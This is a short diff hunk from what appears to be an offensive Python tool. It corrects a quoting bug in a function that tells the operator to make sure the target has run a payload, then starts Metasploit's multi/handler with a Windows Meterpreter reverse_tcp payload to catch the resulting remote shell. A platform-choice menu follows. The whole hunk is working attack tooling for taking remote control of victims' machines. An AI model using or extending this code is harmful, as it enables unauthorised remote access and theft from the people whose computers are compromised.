@@ -233,7 +233,7 @@ def exploitwindowspayload():
     prYellow("make sure the target ran the payload")
     time.sleep(10)
     os.system('cd $HOME ')
-    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run")
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run'")
 def choice1():
     e1 = input('''Choose Platform
                [1] Android
